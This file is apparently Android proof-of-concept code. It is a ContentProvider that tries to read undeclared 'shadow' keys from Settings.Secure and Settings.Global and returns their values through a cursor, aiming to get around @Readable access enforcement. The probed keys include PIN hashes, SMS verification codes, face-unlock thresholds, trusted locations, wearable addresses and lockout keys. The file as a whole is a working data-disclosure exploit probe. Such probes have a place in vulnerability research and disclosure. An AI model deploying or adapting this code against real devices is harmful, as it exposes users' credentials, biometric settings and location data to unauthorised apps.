package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.ContentResolver;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.provider.Settings;

/**
 * Probes for "shadow settings" — keys written by system components to Settings.Secure
 * that are NOT declared as public static final fields in Settings.Secure class,
 * thus bypassing @Readable annotation enforcement entirely.
 */
public class SettingsGapProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"key", "value"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        ContentResolver cr = getContext().getContentResolver();

        cursor.addRow(new Object[]{"=== ENFORCEMENT GAP: Undeclared keys (bypass @Readable) ===", ""});

        // Face unlock / biometric parameters (written by FaceLock/FaceService)
        cursor.addRow(new Object[]{"--- Face Unlock Config ---", ""});
        readSecure(cr, cursor, "facelock_liveliness_recognition_threshold");
        readSecure(cr, cursor, "facelock_detection_threshold");
        readSecure(cr, cursor, "facelock_max_center_movement");
        readSecure(cr, cursor, "lockscreen.options");
        readSecure(cr, cursor, "face_unlock_education_info_displayed");
        readSecure(cr, cursor, "face_unlock_app_enabled");
        readSecure(cr, cursor, "face_unlock_always_require_confirmation");
        readSecure(cr, cursor, "face_unlock_diversity_required");

        // Active unlock / trust agent config
        cursor.addRow(new Object[]{"--- Active Unlock / Trust Agent ---", ""});
        readSecure(cr, cursor, "active_unlock_provider");
        readSecure(cr, cursor, "active_unlock_wearable_address");
        readSecure(cr, cursor, "active_unlock_wearable_name");
        readSecure(cr, cursor, "trust_agent_component");
        readSecure(cr, cursor, "trusted_locations_data");
        readSecure(cr, cursor, "trusted_locations_raw");
        readSecure(cr, cursor, "trust_agent_click_intent");

        // Lockscreen / keyguard internal
        cursor.addRow(new Object[]{"--- Lockscreen Internal ---", ""});
        readSecure(cr, cursor, "lockscreen.password_type");
        readSecure(cr, cursor, "lockscreen.password_type_alternate");
        readSecure(cr, cursor, "lock_pattern_visible_pattern");
        readSecure(cr, cursor, "lock_pattern_tactile_feedback_enabled");
        readSecure(cr, cursor, "lockscreen.power_button_instantly_locks");
        readSecure(cr, cursor, "lockscreen.profilechallenge");
        readSecure(cr, cursor, "lock_screen_owner_info_enabled");
        readSecure(cr, cursor, "lock_screen_owner_info");

        // Device encryption / credential
        cursor.addRow(new Object[]{"--- Encryption / Credential ---", ""});
        readSecure(cr, cursor, "device_policy_manager_state");
        readSecure(cr, cursor, "device_pin_hash");
        readSecure(cr, cursor, "lock_screen_pin_hash");
        readSecure(cr, cursor, "encryption_password_type");

        // Bluetooth internal
        cursor.addRow(new Object[]{"--- Bluetooth ---", ""});
        readSecure(cr, cursor, "bluetooth_addr_valid");
        readSecure(cr, cursor, "bluetooth_le_address");
        readSecure(cr, cursor, "bluetooth_addr_le");

        // Smart Lock / On-body detection
        cursor.addRow(new Object[]{"--- Smart Lock ---", ""});
        readSecure(cr, cursor, "on_body_detection_enabled");
        readSecure(cr, cursor, "smart_lock_bluetooth_trusted_devices");
        readSecure(cr, cursor, "smart_lock_trusted_faces");
        readSecure(cr, cursor, "trust_agents_extend_unlock");

        // GMS / Google internal
        cursor.addRow(new Object[]{"--- GMS Internal ---", ""});
        readSecure(cr, cursor, "gms_checkin_timeout");
        readSecure(cr, cursor, "gms_core_version");
        readSecure(cr, cursor, "google_account_smsverifycode");
        readSecure(cr, cursor, "last_synced_gmscore_version");

        // OEM / Pixel specific
        cursor.addRow(new Object[]{"--- Pixel/OEM ---", ""});
        readSecure(cr, cursor, "adaptive_sleep");
        readSecure(cr, cursor, "camera_gesture_disabled");
        readSecure(cr, cursor, "double_tap_to_wake");
        readSecure(cr, cursor, "aware_enabled");
        readSecure(cr, cursor, "silence_gesture");
        readSecure(cr, cursor, "skip_gesture");
        readSecure(cr, cursor, "columbus_enabled");
        readSecure(cr, cursor, "columbus_double_tap_action");

        // Security-related internal
        cursor.addRow(new Object[]{"--- Security Internal ---", ""});
        readSecure(cr, cursor, "sms_verification_code");
        readSecure(cr, cursor, "last_password_entry");
        readSecure(cr, cursor, "lockout_permanent_key");
        readSecure(cr, cursor, "pattern_ever_chosen");
        readSecure(cr, cursor, "visible_pattern_enabled");

        // Settings.Global shadow keys
        cursor.addRow(new Object[]{"=== Settings.Global Shadow Keys ===", ""});
        readGlobal(cr, cursor, "hidden_api_blacklist_exemptions");
        readGlobal(cr, cursor, "policy_control");
        readGlobal(cr, cursor, "captive_portal_mode");
        readGlobal(cr, cursor, "captive_portal_server");
        readGlobal(cr, cursor, "connectivity_check_server");
        readGlobal(cr, cursor, "private_dns_mode");
        readGlobal(cr, cursor, "private_dns_specifier");
        readGlobal(cr, cursor, "selinux_status");
        readGlobal(cr, cursor, "verifier_verify_adb_installs");
        readGlobal(cr, cursor, "package_verifier_user_consent");
        readGlobal(cr, cursor, "debug_app");
        readGlobal(cr, cursor, "wait_for_debugger");

        return cursor;
    }

    private void readSecure(ContentResolver cr, MatrixCursor cursor, String key) {
        try {
            String val = Settings.Secure.getString(cr, key);
            cursor.addRow(new Object[]{"secure:" + key, val != null ? val : "(null)"});
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"secure:" + key, "SEC:" + trunc(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"secure:" + key, "ERR:" + trunc(e.getMessage())});
        }
    }

    private void readGlobal(ContentResolver cr, MatrixCursor cursor, String key) {
        try {
            String val = Settings.Global.getString(cr, key);
            cursor.addRow(new Object[]{"global:" + key, val != null ? val : "(null)"});
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"global:" + key, "SEC:" + trunc(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"global:" + key, "ERR:" + trunc(e.getMessage())});
        }
    }

    private String trunc(String s) {
        if (s == null) return "null";
        return s.length() > 150 ? s.substring(0, 150) : s;
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
